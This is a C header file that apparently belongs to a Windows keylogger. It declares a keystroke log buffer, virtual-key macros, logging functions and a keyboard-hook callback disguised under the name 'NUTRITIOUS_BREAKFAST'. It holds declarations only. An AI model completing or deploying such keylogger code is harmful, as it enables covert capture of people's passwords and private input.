#pragma once

#include <Windows.h>

typedef struct _kldata {
	CHAR* data;
	UINT64 used;
	UINT64 size;
} kldata;

extern kldata* logdata;


#define IS_NUMERIC_VK(vk) (vk >= 0x30 && vk <= 0x39)
#define IS_ALPHA_VK(vk) ((vk >= 0x41 && vk <= 0x5A))


DWORD append_log_data(kldata* kld, CHAR* data, UINT64 size);
DWORD can_log_data(kldata* kld, UINT64 datasize);

LRESULT CALLBACK NUTRITIOUS_BREAKFAST(int nCode, WPARAM wParam, LPARAM lParam);

